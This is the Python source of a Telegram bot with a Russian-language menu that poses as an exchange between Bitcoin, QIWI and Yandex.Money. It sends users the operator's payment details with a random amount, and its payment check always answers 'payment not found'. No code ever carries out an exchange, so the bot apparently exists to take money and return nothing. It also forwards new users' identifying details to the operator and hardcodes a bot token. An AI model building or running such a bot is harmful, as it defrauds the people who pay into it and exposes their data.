import telebot
from telebot import types
import config
import time
from time import sleep
import random
#===========
bot = telebot.TeleBot('815289397:AAE1faffnBMIvvpm-8L4ULYuYeUolLXLdVg')# Токен вставлять в файле config.py
#===========
#Переменные
#Клавиатура в начале-----------------------------------------------
start_keyboard = types.ReplyKeyboardMarkup(resize_keyboard = True)
start_keyboard.row('💲Обменять')
start_keyboard.row('📈Информация', '📩Поддержка')
#=================================
buy_keyboard = types.ReplyKeyboardMarkup(resize_keyboard = True)
buy_keyboard.row('BTC - QIWI','QIWI - BTC')
buy_keyboard.row('Яндекс.Деньги - BTC','BTC - Яндекс.Деньги',)
buy_keyboard.row('QIWI - Яндек.Деньги','Яндекс.Деньги - QIWI')
buy_keyboard.row('◀Назад')
#=====================
down_keyboard = types.ReplyKeyboardMarkup(resize_keyboard= True)
down_keyboard.row('◀Назад')
#==============================
keyboard_find = types.ReplyKeyboardMarkup(resize_keyboard = True)
keyboard_find.row('💲Проверить','◀Назад')
#=======================
#Основная часть бота
@bot.message_handler(commands = ['start'])
def say(message):
	bot.send_message(message.chat.id, config.text, reply_markup = start_keyboard)
	if message.from_user.id != config.ID:
		bot.send_message(config.ID, '☑Новый пользователь,{}!☑ \n1 - @{}✔\n2 - {}⏰\n3 - {}\n4 - {}'.format(message.from_user.first_name,message.from_user.username,time.strftime('%X'),message.from_user.id,message.from_user.language_code))


#===================Меню=============================#
#====================================================#
@bot.message_handler(content_types = ['text'])
def menu(message):
	if message.text == '📩Поддержка':
		bot.send_message(message.chat.id, config.contact , reply_markup = down_keyboard)
	elif message.text == '📈Информация':
		bot.send_message(message.chat.id,config.inf, reply_markup = down_keyboard)
	elif message.text == '💲Обменять':
		bot.send_message(message.chat.id,'💰Выберите обменные валюту💰' ,reply_markup = buy_keyboard)
	elif message.text == '◀Назад':
		bot.send_message(message.chat.id,config.text,reply_markup = start_keyboard)
	elif message.text == '💲Проверить':
		bot.send_message(message.chat.id,'Платеж не найден - повотрите позже',reply_markup = start_keyboard)
#====================================================================================================	
	elif message.text.startswith('QIWI'):
		bot.send_message(message.chat.id, config.text_for_payment.format(config.QIWI,random.randint(10000,60000)),reply_markup = keyboard_find)
	elif message.text.startswith('BTC'):
		bot.send_message(message.chat.id, config.text_for_payment.format(config.BTC,random.randint(10000,60000)),reply_markup = keyboard_find)
	elif message.text.startswith('Яндекс'):
		bot.send_message(message.chat.id, config.text_for_payment.format(config.YANDEX,random.randint(10000,60000)),reply_markup = keyboard_find) #Опалата
#=====================================================================================================
	else:
		bot.send_message(message.chat.id,'Введите команду /start',reply_to_message_id = message.message_id)
#=============================================
if __name__ == '__main__':
	bot.polling(none_stop = True)